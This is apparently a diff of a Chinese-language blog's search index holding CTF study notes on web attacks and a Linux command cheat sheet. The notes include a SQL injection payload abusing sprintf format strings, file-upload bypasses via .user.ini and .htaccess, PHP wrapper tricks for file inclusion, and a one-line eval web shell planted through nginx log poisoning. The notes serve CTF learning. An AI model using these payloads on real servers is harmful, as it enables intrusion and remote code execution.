+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> 当传入pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    得到 and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      之后第三步 select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   但是%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
+
+<h1 id="linxu命令"><a href="#linxu命令" class="headerlink" title="linxu命令:"></a>linxu命令:</h1><h2 id="1-使用-可以分隔两个命令一起执行"><a href="#1-使用-可以分隔两个命令一起执行" class="headerlink" title="1.使用;可以分隔两个命令一起执行"></a>1.使用;可以分隔两个命令一起执行</h2>]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -3853,6 +3132,727 @@
       </categories>
       <tags>
         <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="1-user-ini的使用"><a href="#1-user-ini的使用" class="headerlink" title="1. .user.ini的使用:"></a>1. .user.ini的使用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<span class="keyword">require</span>(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<span class="keyword">exit</span>()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</span><br><span class="line">    --必须在upload目录下有index.php这样才成功，没有可以尝试上传一个</span><br><span class="line">                                       --auto_append_file在木马文件上传后上传</span><br><span class="line">                                       --auto_prepend_file在木马文件上传前上传</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-绕过内容里不能包含php"><a href="#2-绕过内容里不能包含php" class="headerlink" title="2.绕过内容里不能包含php:"></a>2.绕过内容里不能包含php:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 条件：short_open_tags=on</span><br><span class="line"><span class="meta">&lt;?</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>. 无条件</span><br><span class="line"><span class="meta">&lt;?=</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>. 条件： 开启配置参数asp_tags=on 且php版本 &lt; <span class="number">7.0</span> </span><br><span class="line">&lt;% xxx %&gt;</span><br><span class="line"><span class="number">4</span>. 条件：php版本 &lt; <span class="number">7.0</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-增加文件头"><a href="#3-增加文件头" class="headerlink" title="3.增加文件头:"></a>3.增加文件头:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A    ---是GIF图像格式的一种版本标识</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>魔术头（十六进制）</th>
+<th>魔术头（ASCII）</th>
+<th>示例用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>GIF89a</strong></td>
+<td><code>47 49 46 38 39 61</code></td>
+<td><code>GIF89a</code></td>
+<td>正规 GIF 图</td>
+</tr>
+<tr>
+<td><strong>GIF87a</strong></td>
+<td><code>47 49 46 38 37 61</code></td>
+<td><code>GIF87a</code></td>
+<td>老版本 GIF 图</td>
+</tr>
+<tr>
+<td><strong>PNG</strong></td>
+<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
+<td><code>.PNG....</code></td>
+<td>PNG 图</td>
+</tr>
+<tr>
+<td><strong>JPG</strong> &#x2F; JPEG</td>
+<td><code>FF D8 FF</code></td>
+<td>N&#x2F;A</td>
+<td>开头是 <code>FFD8FF</code>，结尾是 <code>FFD9</code></td>
+</tr>
+<tr>
+<td><strong>PDF</strong></td>
+<td><code>25 50 44 46 2D</code></td>
+<td><code>%PDF-</code></td>
+<td>经典文档上传绕过</td>
+</tr>
+<tr>
+<td><strong>ZIP</strong></td>
+<td><code>50 4B 03 04</code></td>
+<td><code>PK..</code></td>
+<td>上传压缩包</td>
+</tr>
+<tr>
+<td><strong>RAR</strong></td>
+<td><code>52 61 72 21 1A 07 00</code></td>
+<td><code>Rar!...</code></td>
+<td>压缩文件</td>
+</tr>
+<tr>
+<td><strong>EXE</strong>（Windows）</td>
+<td><code>4D 5A</code></td>
+<td><code>MZ</code></td>
+<td>可执行文件</td>
+</tr>
+<tr>
+<td><strong>ELF</strong>（Linux）</td>
+<td><code>7F 45 4C 46</code></td>
+<td><code>.ELF</code></td>
+<td>Linux 二进制</td>
+</tr>
+<tr>
+<td><strong>MP3</strong></td>
+<td><code>49 44 33</code></td>
+<td><code>ID3</code></td>
+<td>音频文件头</td>
+</tr>
+<tr>
+<td><strong>DOCX &#x2F; XLSX &#x2F; PPTX</strong></td>
+<td><code>50 4B 03 04</code></td>
+<td>ZIP！</td>
+<td>Office 新版其实是 ZIP 容器</td>
+</tr>
+<tr>
+<td><strong>OLD DOC (97-2003)</strong></td>
+<td><code>D0 CF 11 E0 A1 B1 1A E1</code></td>
+<td>N&#x2F;A</td>
+<td>老式 Office 文件</td>
+</tr>
+</tbody></table>
+<h3 id="4-远程包含"><a href="#4-远程包含" class="headerlink" title="4.远程包含:"></a>4.远程包含:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在服务器上可以通过ip转数字，让他访问木马脚本网站，并执行</span><br><span class="line">    <span class="number">139.224</span>.<span class="number">54.229</span>====<span class="number">2346727141</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-通过jpg-gif-png二次渲染"><a href="#5-通过jpg-gif-png二次渲染" class="headerlink" title="5.通过jpg.gif.png二次渲染;"></a>5.通过jpg.gif.png二次渲染;</h3><h4 id="1-是否存在二次渲染"><a href="#1-是否存在二次渲染" class="headerlink" title="1.是否存在二次渲染:"></a>1.是否存在二次渲染:</h4><table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+<th>判断方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>上传后图像被重新压缩</td>
+<td>MD5不一致</td>
+<td>上传后下载图片对比</td>
+</tr>
+<tr>
+<td>上传的 EXIF 信息被清除</td>
+<td>文件属性被抹掉</td>
+<td><code>exif_read_data()</code> 检查</td>
+</tr>
+<tr>
+<td>伪代码失效</td>
+<td>木马内容被去掉</td>
+<td><code>&lt;?php ... ?&gt;</code> 被清空</td>
+</tr>
+<tr>
+<td>文件大小被大幅缩小</td>
+<td>说明被重新处理</td>
+<td>查看上传前后大小差距</td>
+</tr>
+<tr>
+<td>Webshell 不再执行</td>
+<td>二次渲染清除了恶意代码</td>
+<td>手动访问判断是否能执行PHP代码</td>
+</tr>
+</tbody></table>
+<h3 id="6-通过-htaccess包含"><a href="#6-通过-htaccess包含" class="headerlink" title="6.通过.htaccess包含:"></a>6.通过.htaccess包含:</h3><p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>：找不到被包含的文件时只会产生警告，脚本将继续执行。</span><br><span class="line">- <span class="keyword">include_once</span>：和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="keyword">require</span>：找不到被包含的文件时会产生致命错误，并停止脚本。</span><br><span class="line">- <span class="keyword">require_once</span>：和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():也可以包含伪协议</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-通过伪协议"><a href="#1-通过伪协议" class="headerlink" title="1.通过伪协议"></a>1.通过伪协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php:<span class="comment">//filter  主要用于读取源码</span></span><br><span class="line"><span class="number">2</span>.php:<span class="comment">//input  经常使用file_get_contents获取php://input内容</span></span><br><span class="line"><span class="number">3</span>.data:<span class="comment">//  执行命令      </span></span><br><span class="line"><span class="number">4</span>.file:<span class="comment">//  访问本地文件系统</span></span><br><span class="line"><span class="number">5</span>.compress.zlib:<span class="comment">//     协议用于读取压缩文件</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-php-filter-使用方法"><a href="#1-php-filter-使用方法" class="headerlink" title="1.php:&#x2F;&#x2F;filter 使用方法"></a>1.php:&#x2F;&#x2F;filter 使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=过滤器名/resource=目标文件        --基本格式     --read可以改为write </span></span><br><span class="line">                                        --默认是read，有时可不写read,可以不加过滤器</span><br><span class="line">一些过滤器:</span><br><span class="line">            convert.base64-encode	base64 编码输出</span><br><span class="line">            convert.base64-decode	base64 解码输入</span><br><span class="line">            convert.quoted-printable-encode	quoted-printable 编码</span><br><span class="line">            <span class="keyword">string</span>.strip_tags	去除 HTML/PHP 标签      --php7.<span class="number">3</span>.x后废弃</span><br><span class="line">            <span class="keyword">string</span>.rot13	ROT13 替换加密</span><br><span class="line">            <span class="keyword">string</span>.toupper	字母转大写</span><br><span class="line">            <span class="keyword">string</span>.tolower	字母转小写</span><br><span class="line">                </span><br></pre></td></tr></table></figure>
+
+<h4 id="2-php-input-使用方法"><a href="#2-php-input-使用方法" class="headerlink" title="2.php:&#x2F;&#x2F;input 使用方法:"></a>2.php:&#x2F;&#x2F;input 使用方法:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//input                            --用于读取 HTTP 请求体的原始内容</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-data-使用方法"><a href="#3-data-使用方法" class="headerlink" title="3.data:&#x2F;&#x2F;使用方法"></a>3.data:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//&lt;mediatype&gt;[;base64],&lt;data&gt;       --mediatype（MIME类型）比如：text/plain、text/html  </span></span><br><span class="line">                               --data，必须是完整的php代码</span><br><span class="line">mediatype（MIME类型）:</span><br><span class="line">                    text/plain	纯文本	✅ 推荐，用于执行 PHP 代码</span><br><span class="line">                    text/html	HTML 格式	✅ 也能执行 PHP，显示为网页</span><br><span class="line">                    text/xml	XML 格式	通常用于接口测试</span><br><span class="line">                    application/json	JSON 数据	多用于 API</span><br><span class="line">                    application/x-www-form-urlencoded	表单数据（普通POST）	API 数据传输</span><br><span class="line">                    application/javascript	JS 脚本	通常用于网页环境，不用于PHP</span><br><span class="line">                    image/png	图片	不适合执行 PHP</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-file-使用方法"><a href="#4-file-使用方法" class="headerlink" title="4.file:&#x2F;&#x2F;使用方法"></a>4.file:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//绝对路径                 </span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-通过日志"><a href="#2-通过日志" class="headerlink" title="2.通过日志"></a>2.通过日志</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=/<span class="keyword">var</span>/log/nginx/access.log     --通过nginx中日志的路径</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span>      --一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>         --查看配置信息</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linxu命令</title>
+    <url>/2025/06/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="linux-常用命令"><a href="#linux-常用命令" class="headerlink" title="linux 常用命令"></a>linux 常用命令</h1><h3 id="1-新建虚拟环境"><a href="#1-新建虚拟环境" class="headerlink" title="1.新建虚拟环境"></a>1.新建虚拟环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入虚拟环境:   source venv/bin/activate</span><br><span class="line">启动一个 screen 会话：screen -S mysession</span><br><span class="line">以后可以用下面的命令重新连接会话： screen -r mysession</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-复制文件命令"><a href="#2-复制文件命令" class="headerlink" title="2.复制文件命令:"></a>2.复制文件命令:</h3><h4 id="1-cp命令"><a href="#1-cp命令" class="headerlink" title="1.cp命令:"></a>1.cp命令:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp [选项] 源文件 目标文件/目录</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cp a.txt b.txt</code></td>
+<td>把 <code>a.txt</code> 复制成 <code>b.txt</code></td>
+</tr>
+<tr>
+<td><code>cp a.txt /tmp/</code></td>
+<td>把 <code>a.txt</code> 复制到 <code>/tmp/</code> 目录</td>
+</tr>
+<tr>
+<td><code>cp -r dir1 dir2</code></td>
+<td>递归复制目录（必须加 <code>-r</code>）</td>
+</tr>
+<tr>
+<td><code>cp -f a b</code></td>
+<td>强制覆盖目标文件</td>
+</tr>
+<tr>
+<td><code>cp -u a b</code></td>
+<td>仅当源文件比目标新时才复制（常用于备份）</td>
+</tr>
+</tbody></table>
+<h4 id="2-tee命令"><a href="#2-tee命令" class="headerlink" title="2.tee命令:"></a>2.tee命令:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command | tee [选项] 文件名</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cp a.txt b.txt</code></td>
+<td>把 <code>a.txt</code> 复制成 <code>b.txt</code></td>
+</tr>
+<tr>
+<td><code>cp a.txt /tmp/</code></td>
+<td>把 <code>a.txt</code> 复制到 <code>/tmp/</code> 目录</td>
+</tr>
+<tr>
+<td><code>cp -r dir1 dir2</code></td>
+<td>递归复制目录（必须加 <code>-r</code> 选项）</td>
+</tr>
+<tr>
+<td><code>cp -f a b</code></td>
+<td>强制覆盖目标文件，无论目标文件是否存在</td>
+</tr>
+<tr>
+<td><code>cp -u a b</code></td>
+<td>仅当源文件比目标文件更新时才复制（常用于备份）</td>
+</tr>
+<tr>
+<td><code>cp -i a b</code></td>
+<td>在覆盖目标文件前提示用户确认</td>
+</tr>
+<tr>
+<td><code>cp -v a b</code></td>
+<td>显示详细的复制过程，列出正在复制的文件</td>
+</tr>
+<tr>
+<td><code>cp -a dir1 dir2</code></td>
+<td>复制目录及其内容，保持文件的原始属性（包括符号链接）</td>
+</tr>
+<tr>
+<td><code>cp -l a b</code></td>
+<td>创建目标文件的硬链接，而非复制</td>
+</tr>
+</tbody></table>
+<h3 id="3-删除文件操作"><a href="#3-删除文件操作" class="headerlink" title="3.删除文件操作"></a>3.删除文件操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">| 命令          | 作用                   |</span><br><span class="line">| ------------- | ---------------------- |</span><br><span class="line">| `rm file`     | 删除单个文件           |</span><br><span class="line">| `rm -f file`  | 强制删除，不提示       |</span><br><span class="line">| `rm -r dir`   | 删除目录（递归）       |</span><br><span class="line">| `rm -rf dir`  | 强制删除整个目录       |</span><br><span class="line">| `unlink file` | 删除单文件的轻量命令   |</span><br><span class="line">| `find + rm`   | 删除匹配规则的批量文件 |</span><br><span class="line"></span><br><span class="line">### 4.使用代理</span><br><span class="line"></span><br><span class="line">``` php </span><br><span class="line">./clash -f ./config.yaml                           --直接运行</span><br><span class="line">nohup ./clash -f ./config.yaml &gt; clash.log 2&gt;&amp;1 &amp;       --以后台的方式运行</span><br></pre></td></tr></table></figure>
+
+<h4 id="测试是否成功"><a href="#测试是否成功" class="headerlink" title="测试是否成功"></a>测试是否成功</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试 HTTP 代理端口：</span><br><span class="line">            curl -x http:<span class="comment">//127.0.0.1:7890 https://ipinfo.io</span></span><br><span class="line">测试 SOCKS5 端口：</span><br><span class="line">               curl --socks5 <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7891</span> https:<span class="comment">//ipinfo.io</span></span><br><span class="line">proxychains curl https:<span class="comment">//ipinfo.io</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-xargs传递输出"><a href="#5-xargs传递输出" class="headerlink" title="5.xargs传递输出:"></a>5.xargs传递输出:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">它读取标准输入（stdin）的一行一行内容，然后把它“拼接”到后面的命令后面。</span><br><span class="line">xargs cat =cat 文件1 文件2 文件3 ...</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-cat函数类似的-—linxu函数"><a href="#6-cat函数类似的-—linxu函数" class="headerlink" title="6.cat函数类似的 —linxu函数"></a>6.cat函数类似的 —linxu函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 </span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">paste: 每一行是两个文件对应行用TAB拼接起来。</span><br><span class="line">rev: 每一行的字符顺序被颠倒输出了。</span><br><span class="line">strings:  -- 会从二进制文件（如可执行文件、.so 文件、图片等）中找出 可打印字符序列（可读文本）。</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<h3 id="7-创建一个文件"><a href="#7-创建一个文件" class="headerlink" title="7.创建一个文件:"></a>7.创建一个文件:</h3><table>
+<thead>
+<tr>
+<th>命令示例</th>
+<th>作用</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>touch file.txt</code></td>
+<td>创建空文件</td>
+<td>文件已存在时更新时间戳</td>
+</tr>
+<tr>
+<td><code>echo &quot;hello&quot; &gt; file.txt</code></td>
+<td>创建并写入内容</td>
+<td>会覆盖已有文件内容</td>
+</tr>
+<tr>
+<td><code>cat &gt; file.txt</code> （输入内容后按 <code>Ctrl+D</code>）</td>
+<td>手动输入内容创建文件</td>
+<td>适合一次性写多行</td>
+</tr>
+<tr>
+<td><code>printf &quot;flag&#123;123&#125;\n&quot; &gt; flag.txt</code></td>
+<td>创建并写入格式化内容</td>
+<td>可用于生成 CTF flag 等结构化内容</td>
+</tr>
+<tr>
+<td><code>&gt; empty.txt</code></td>
+<td>创建空文件</td>
+<td>文件已存在则清空内容</td>
+</tr>
+<tr>
+<td><code>dd if=/dev/zero of=bigfile.bin bs=1M count=10</code></td>
+<td>创建指定大小文件</td>
+<td>常用于测试、磁盘填充</td>
+</tr>
+<tr>
+<td><code>vi file.php</code> <code>nano file.txt</code></td>
+<td>打开编辑器创建</td>
+<td>写完保存即可生成文件</td>
+</tr>
+</tbody></table>
+<h3 id="8-查看进程"><a href="#8-查看进程" class="headerlink" title="8.查看进程;"></a>8.查看进程;</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ps aux</code></td>
+<td>显示所有用户的所有进程</td>
+<td>&#96;ps aux</td>
+</tr>
+<tr>
+<td><code>top</code> &#x2F; <code>htop</code></td>
+<td>实时显示进程动态信息</td>
+<td><code>top</code>（<code>htop</code>更美观）</td>
+</tr>
+<tr>
+<td><code>pidof &lt;name&gt;</code></td>
+<td>查找某个程序的 PID</td>
+<td><code>pidof clash</code></td>
+</tr>
+<tr>
+<td><code>pgrep &lt;pattern&gt;</code></td>
+<td>进程名匹配并返回 PID</td>
+<td><code>pgrep -fl clash</code></td>
+</tr>
+<tr>
+<td><code>lsof -p &lt;pid&gt;</code></td>
+<td>查看某进程打开的文件</td>
+<td><code>lsof -p 1234</code></td>
+</tr>
+<tr>
+<td><code>netstat -tunlp</code></td>
+<td>查看进程监听端口</td>
+<td>&#96;netstat -tunlp</td>
+</tr>
+<tr>
+<td><code>ss -tulnp</code></td>
+<td>更快的 <code>netstat</code> 替代</td>
+<td>&#96;ss -tulnp</td>
+</tr>
+<tr>
+<td><code>strace -p &lt;pid&gt;</code></td>
+<td>跟踪某进程系统调用</td>
+<td><code>strace -p 1234</code></td>
+</tr>
+</tbody></table>
+<h3 id="9-查看端口"><a href="#9-查看端口" class="headerlink" title="9.查看端口:"></a>9.查看端口:</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>netstat -tunlp</code></td>
+<td>查看所有监听端口 + 对应进程</td>
+<td>&#96;netstat -tunlp</td>
+</tr>
+<tr>
+<td><code>ss -tulnp</code></td>
+<td>更快的 <code>netstat</code> 替代</td>
+<td>&#96;ss -tulnp</td>
+</tr>
+<tr>
+<td><code>lsof -i:&lt;端口&gt;</code></td>
+<td>查看端口对应的进程</td>
+<td><code>lsof -i:7890</code></td>
+</tr>
+<tr>
+<td><code>fuser &lt;端口&gt;/tcp</code></td>
+<td>快速查看哪个PID占用了端口</td>
+<td><code>fuser 8080/tcp</code></td>
+</tr>
+<tr>
+<td><code>cat /proc/net/tcp</code></td>
+<td>直接读取系统 TCP 表</td>
+<td>可写脚本查所有端口状态</td>
+</tr>
+<tr>
+<td><code>nmap 127.0.0.1 -p-</code></td>
+<td>扫描本地开放端口</td>
+<td>本地横向扫描、提权辅助</td>
+</tr>
+</tbody></table>
+<h4 id="1-参数相关"><a href="#1-参数相关" class="headerlink" title="1.参数相关:"></a>1.参数相关:</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-t</code></td>
+<td>TCP</td>
+<td>仅显示 TCP 连接</td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td>UDP</td>
+<td>仅显示 UDP 连接</td>
+</tr>
+<tr>
+<td><code>-l</code></td>
+<td>Listen</td>
+<td>仅显示监听状态（如服务器在等待连接）</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>Numeric</td>
+<td>不解析域名&#x2F;服务名，显示原始IP和端口号（加速、绕过DNS）</td>
+</tr>
+<tr>
+<td><code>-p</code></td>
+<td>Process</td>
+<td>显示哪个进程（PID&#x2F;程序名）占用此连接，需要 <code>root</code> 权限</td>
+</tr>
+</tbody></table>
+<h3 id="10-把帮助信息设置为中文"><a href="#10-把帮助信息设置为中文" class="headerlink" title="10.把帮助信息设置为中文:"></a>10.把帮助信息设置为中文:</h3><h4 id="1-下载汉化包"><a href="#1-下载汉化包" class="headerlink" title="1.下载汉化包;"></a>1.下载汉化包;</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install language-pack-zh-hans</span><br></pre></td></tr></table></figure>
+
+<p>之后可以这样访问中文:    LANG&#x3D;zh_CN.UTF-8 netstat –help</p>
+<h4 id="2-将LANG-zh-CN-UTF-8设置别名"><a href="#2-将LANG-zh-CN-UTF-8设置别名" class="headerlink" title="2.将LANG&#x3D;zh_CN.UTF-8设置别名;"></a>2.将LANG&#x3D;zh_CN.UTF-8设置别名;</h4><h5 id="1-临时设置别名"><a href="#1-临时设置别名" class="headerlink" title="1.临时设置别名;"></a>1.临时设置别名;</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">临时生效（当前终端有效）</span><br><span class="line">          alias chelp=&#x27;LANG=zh_CN.UTF-8&#x27;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-永久生效（自动加载）"><a href="#2-永久生效（自动加载）" class="headerlink" title="2.永久生效（自动加载）"></a>2.永久生效（自动加载）</h5><p>编辑你的 shell 配置文件：</p>
+<ul>
+<li>如果你用的是 bash：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果你用的是 zsh：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<p>添加这一行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">alias chelp=&#x27;LANG=zh_CN.UTF-8&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>保存后让它立即生效：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">source ~/.bashrc   # 或 ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-ls命令"><a href="#11-ls命令" class="headerlink" title="11.ls命令"></a>11.ls命令</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td>以长格式列出文件详细信息（权限、用户、大小、修改时间等）</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>显示所有文件，包括以 <code>.</code> 开头的隐藏文件</td>
+</tr>
+<tr>
+<td><code>-h</code></td>
+<td>与 <code>-l</code> 配合使用，显示人类可读的文件大小（如 1K，234M）</td>
+</tr>
+<tr>
+<td><code>-S</code></td>
+<td>按文件大小排序，默认是从大到小</td>
+</tr>
+<tr>
+<td><code>-r</code></td>
+<td>反向排序（与 <code>-t</code>、<code>-S</code> 等配合使用时效果明显）</td>
+</tr>
+<tr>
+<td><code>-t</code></td>
+<td>按时间排序，最近修改的文件排在前面</td>
+</tr>
+<tr>
+<td><code>-R</code></td>
+<td>递归列出子目录内容</td>
+</tr>
+<tr>
+<td><code>-d</code></td>
+<td>如果后面跟的是目录，只显示目录本身而不是其内容</td>
+</tr>
+<tr>
+<td><code>-F</code></td>
+<td>在文件名后附上符号（如 <code>/</code> 表示目录，<code>*</code> 表示可执行）</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>显示文件的 inode 编号</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>类似 <code>-l</code>，但显示 UID 和 GID 而非用户名和组名</td>
+</tr>
+<tr>
+<td><code>--color=auto</code></td>
+<td>给文件名上色（目录蓝色、可执行绿色等），通常默认启用</td>
+</tr>
+<tr>
+<td><code>--time=ctime</code></td>
+<td>使用变更时间（ctime）排序，而不是默认的修改时间（mtime）</td>
+</tr>
+<tr>
+<td><code>-1</code></td>
+<td>每个文件单独一行显示（默认多个列显示时使用）</td>
+</tr>
+</tbody></table>
+<h4 id="ls常用组合"><a href="#ls常用组合" class="headerlink" title="ls常用组合"></a>ls常用组合</h4><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>用法说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ls -alh</code></td>
+<td>列出所有文件 + 详细信息 + 可读大小</td>
+</tr>
+<tr>
+<td><code>ls -lhS</code></td>
